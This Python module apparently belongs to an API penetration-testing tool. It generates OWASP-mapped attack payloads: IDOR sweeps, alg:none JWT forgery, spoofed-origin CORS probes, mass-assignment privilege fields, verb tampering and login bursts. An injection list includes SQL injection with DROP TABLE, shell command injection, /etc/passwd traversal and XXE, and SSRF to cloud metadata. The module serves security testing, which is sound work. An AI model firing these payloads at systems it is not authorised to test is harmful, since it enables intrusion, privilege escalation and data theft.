"""
skills/security_payloads.py

Named security campaign payload generators.
Each function returns List[Dict] compatible with SiegeEngine.execute_assault().
Payload dict keys: method, endpoint, payload, headers, _attack_type (optional metadata).

OWASP API Security Top 10 (2023) mapping:
  idor_sweep       → API1:2023 Broken Object Level Authorization
  jwt_attacks      → API2:2023 Broken Authentication
  mass_assignment  → API3:2023 Broken Object Property Level Authorization
  rate_limit_probe → API4:2023 Unrestricted Resource Consumption
  verb_tamper      → API5:2023 Broken Function Level Authorization
  cors_probe       → API7:2023 Security Misconfiguration
  header_audit     → API7:2023 Security Misconfiguration
  injection_probe  → API8:2023 Security Misconfiguration / Injection
"""

import re
from typing import Any, Dict, List, Optional

OWASP_MAP = {
    "idor_sweep":       "API1:2023",
    "jwt_attacks":      "API2:2023",
    "mass_assignment":  "API3:2023",
    "rate_limit_probe": "API4:2023",
    "verb_tamper":      "API5:2023",
    "cors_probe":       "API7:2023",
    "header_audit":     "API7:2023",
    "injection_probe":  "API8:2023",
}

ALL_CAMPAIGNS = list(OWASP_MAP.keys())

# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def _auth_header(token: str) -> Dict[str, str]:
    if not token:
        return {}
    if token.lower().startswith("bearer "):
        return {"Authorization": token}
    return {"Authorization": f"Bearer {token}"}


def _has_path_param(path: str) -> bool:
    """True if the path contains a URL parameter like /api/items/{id}/ or /api/items/1/."""
    return bool(re.search(r"\{[^}]+\}|/\d+/", path))


def _inject_id(path: str, id_val: int) -> str:
    """Replace {id}/{pk}/{<any>} or trailing /N/ with id_val."""
    # Named placeholders like {id} or {pk}
    path = re.sub(r"\{[^}]+\}", str(id_val), path)
    # Numeric segment like /42/
    path = re.sub(r"/\d+/", f"/{id_val}/", path)
    return path


# ---------------------------------------------------------------------------
# 1. IDOR sweep — API1:2023
# ---------------------------------------------------------------------------

def idor_sweep(
    endpoints: List[Dict],
    auth_token: str,
    alt_token: str = "",
    id_range: int = 30,
) -> List[Dict]:
    """
    Iterate object IDs with an alternate user's token on every endpoint that
    has a path parameter. A 200 with alt_token = likely IDOR.

    endpoints: list of {path, methods} dicts (from endpoint_map.json)
    auth_token: token of the legitimate user (used to seed objects)
    alt_token: token of a second low-privilege user (used to probe)
    """
    payloads = []
    target_token = alt_token or auth_token
    headers = _auth_header(target_token)
    for ep in endpoints:
        path = ep.get("path", "")
        methods = ep.get("methods", ["GET"])
        if not _has_path_param(path) and not path.rstrip("/").split("/")[-1].isdigit():
            # Append /{id}/ to paths without one for a basic probe
            probe_path = path.rstrip("/") + "/{id}/"
        else:
            probe_path = path
        for i in range(1, id_range + 1):
            concrete = _inject_id(probe_path, i)
            for method in (m for m in methods if m.upper() in ("GET", "PUT", "PATCH", "DELETE")):
                payloads.append({
                    "method": method.upper(),
                    "endpoint": concrete,
                    "payload": {},
                    "headers": headers,
                    "_attack_type": "idor",
                })
    return payloads


# ---------------------------------------------------------------------------
# 2. CORS probe — API7:2023
# ---------------------------------------------------------------------------

def cors_probe(
    endpoints: List[Dict],
    auth_token: str = "",
    evil_origin: str = "https://evil-attacker.com",
) -> List[Dict]:
    """
    Send GET + OPTIONS to each endpoint with a spoofed Origin header.
    The response analyzer checks for reflected origin + Allow-Credentials: true.
    """
    payloads = []
    headers = {**_auth_header(auth_token), "Origin": evil_origin}
    seen = set()
    for ep in endpoints:
        path = ep.get("path", "")
        if path in seen:
            continue
        seen.add(path)
        # Preflight
        payloads.append({
            "method": "OPTIONS",
            "endpoint": path,
            "payload": {},
            "headers": {
                **headers,
                "Access-Control-Request-Method": "POST",
                "Access-Control-Request-Headers": "Authorization, Content-Type",
            },
            "_attack_type": "cors",
        })
        # Credentialed GET
        payloads.append({
            "method": "GET",
            "endpoint": path,
            "payload": {},
            "headers": headers,
            "_attack_type": "cors",
        })
    return payloads


# ---------------------------------------------------------------------------
# 3. Security header audit — API7:2023
# ---------------------------------------------------------------------------

_REQUIRED_HEADERS = [
    "Content-Security-Policy",
    "Strict-Transport-Security",
    "X-Frame-Options",
    "X-Content-Type-Options",
    "Referrer-Policy",
]

def header_audit(
    endpoints: List[Dict],
    auth_token: str = "",
) -> List[Dict]:
    """
    Single GET to each unique path; the auto-fan checks response headers.
    """
    payloads = []
    headers = _auth_header(auth_token)
    seen = set()
    for ep in endpoints:
        path = ep.get("path", "")
        if path in seen:
            continue
        seen.add(path)
        payloads.append({
            "method": "GET",
            "endpoint": path,
            "payload": {},
            "headers": headers,
            "_attack_type": "header_audit",
            "_expected_headers": _REQUIRED_HEADERS,
        })
    return payloads


# ---------------------------------------------------------------------------
# 4. JWT attacks — API2:2023
# ---------------------------------------------------------------------------

def jwt_attacks(
    auth_endpoints: List[str],
    valid_token: str = "",
) -> List[Dict]:
    """
    Classic JWT attack payloads against every protected endpoint.
    Includes: alg:none, empty signature, wrong secret, missing bearer.
    """
    import base64, json as _json

    def _forge_alg_none(token: str) -> str:
        """Strip signature, set alg=none."""
        try:
            parts = token.split(".")
            if len(parts) != 3:
                return token
            header = _json.loads(base64.urlsafe_b64decode(parts[0] + "=="))
            header["alg"] = "none"
            new_header = base64.urlsafe_b64encode(
                _json.dumps(header, separators=(",", ":")).encode()
            ).rstrip(b"=").decode()
            return f"{new_header}.{parts[1]}."
        except Exception:
            return token

    payloads = []
    forged_none = _forge_alg_none(valid_token) if valid_token else "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.e30."
    malformed = "eyJhbGciOiJIUzI1NiJ9.AAAA.BBBB"
    empty_bearer = ""

    attack_tokens = [
        ("alg_none",       f"Bearer {forged_none}"),
        ("malformed_jwt",  f"Bearer {malformed}"),
        ("empty_bearer",   "Bearer "),
        ("no_auth",        None),
    ]
    if valid_token:
        # Tamper expiry: flip one char in the payload segment
        parts = valid_token.split(".")
        if len(parts) == 3:
            tampered_payload = parts[1][:-1] + ("A" if parts[1][-1] != "A" else "B")
            attack_tokens.append(("tampered_payload", f"Bearer {parts[0]}.{tampered_payload}.{parts[2]}"))

    for endpoint in auth_endpoints:
        for attack_name, auth_value in attack_tokens:
            h = {"Authorization": auth_value} if auth_value else {}
            payloads.append({
                "method": "GET",
                "endpoint": endpoint,
                "payload": {},
                "headers": h,
                "_attack_type": "jwt",
                "_jwt_variant": attack_name,
            })
    return payloads


# ---------------------------------------------------------------------------
# 5. HTTP verb tampering — API5:2023
# ---------------------------------------------------------------------------

_ALL_VERBS = ["GET", "POST", "PUT", "PATCH", "DELETE", "HEAD", "OPTIONS"]

def verb_tamper(
    endpoints: List[Dict],
    auth_token: str = "",
) -> List[Dict]:
    """
    Send every HTTP verb to every endpoint.  Unexpected 200/201 on a
    verb the endpoint doesn't advertise = broken function-level auth.
    """
    payloads = []
    headers = _auth_header(auth_token)
    for ep in endpoints:
        path = ep.get("path", "")
        advertised = {m.upper() for m in ep.get("methods", [])}
        for verb in _ALL_VERBS:
            if verb in advertised:
                continue  # only probe unadvertised verbs
            payloads.append({
                "method": verb,
                "endpoint": path,
                "payload": {"_test": "verb_tamper"},
                "headers": headers,
                "_attack_type": "verb_tamper",
                "_advertised_methods": list(advertised),
            })
    return payloads


# ---------------------------------------------------------------------------
# 6. Injection probe — API8:2023
# ---------------------------------------------------------------------------

_INJECTION_STRINGS = [
    # SQLi
    "' OR 1=1--",
    "'; DROP TABLE users--",
    "1 UNION SELECT NULL,NULL,NULL--",
    # SSTI (Jinja2/Django)
    "{{7*7}}",
    "{% debug %}",
    "${7*7}",
    # Command injection
    "; id",
    "| whoami",
    "`id`",
    "$(id)",
    # Path traversal
    "../../etc/passwd",
    "..%2F..%2Fetc%2Fpasswd",
    # XXE hint
    "<?xml version=\"1.0\"?><!DOCTYPE x [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><x>&xxe;</x>",
    # SSRF
    "http://169.254.169.254/latest/meta-data/",
    "http://localhost:8000/admin/",
]

def injection_probe(
    endpoints: List[Dict],
    auth_token: str = "",
) -> List[Dict]:
    """
    Inject attack strings into every string-accepting field of POST/PUT/PATCH endpoints.
    For GET endpoints, inject into query parameters.
    """
    payloads = []
    headers = _auth_header(auth_token)
    for ep in endpoints:
        path = ep.get("path", "")
        methods = [m.upper() for m in ep.get("methods", ["GET"])]
        fields = ep.get("fields", []) or ["q", "search", "name", "value", "input", "data"]

        for inject_str in _INJECTION_STRINGS:
            inject_payload = {f: inject_str for f in fields}
            for method in methods:
                if method in ("GET", "HEAD", "OPTIONS"):
                    payloads.append({
                        "method": "GET",
                        "endpoint": path,
                        "payload": inject_payload,
                        "headers": headers,
                        "_attack_type": "injection",
                    })
                elif method in ("POST", "PUT", "PATCH"):
                    payloads.append({
                        "method": method,
                        "endpoint": path,
                        "payload": inject_payload,
                        "headers": headers,
                        "_attack_type": "injection",
                    })
    return payloads


# ---------------------------------------------------------------------------
# 7. Mass assignment — API3:2023
# ---------------------------------------------------------------------------

_PRIVILEGE_FIELDS = {
    "is_staff": True,
    "is_admin": True,
    "is_superuser": True,
    "role": "admin",
    "permission_level": 99,
    "user_type": "admin",
    "verified": True,
    "email_verified": True,
    "balance": 999999,
    "credits": 999999,
}

def mass_assignment(
    endpoints: List[Dict],
    auth_token: str = "",
    extra_fields: Optional[Dict[str, Any]] = None,
) -> List[Dict]:
    """
    Append privilege-escalation fields to every POST/PUT/PATCH payload.
    A 200 that persists these values = mass assignment vulnerability.
    """
    payloads = []
    headers = _auth_header(auth_token)
    injected = {**_PRIVILEGE_FIELDS, **(extra_fields or {})}
    for ep in endpoints:
        path = ep.get("path", "")
        methods = [m.upper() for m in ep.get("methods", [])]
        for method in methods:
            if method not in ("POST", "PUT", "PATCH"):
                continue
            base_payload = {f: "test" for f in (ep.get("fields") or ["name"])}
            payloads.append({
                "method": method,
                "endpoint": path,
                "payload": {**base_payload, **injected},
                "headers": headers,
                "_attack_type": "mass_assignment",
            })
    return payloads


# ---------------------------------------------------------------------------
# 8. Rate limit probe — API4:2023
# ---------------------------------------------------------------------------

def rate_limit_probe(
    login_url: str,
    credentials: Optional[Dict] = None,
    burst_count: int = 60,
) -> List[Dict]:
    """
    Fire burst_count login requests in quick succession.
    If none return 429, rate limiting is absent.
    """
    creds = credentials or {"username": "probe_user", "password": "WrongPassword123!"}
    return [
        {
            "method": "POST",
            "endpoint": login_url,
            "payload": creds,
            "headers": {},
            "_attack_type": "rate_limit",
        }
        for _ in range(burst_count)
    ]
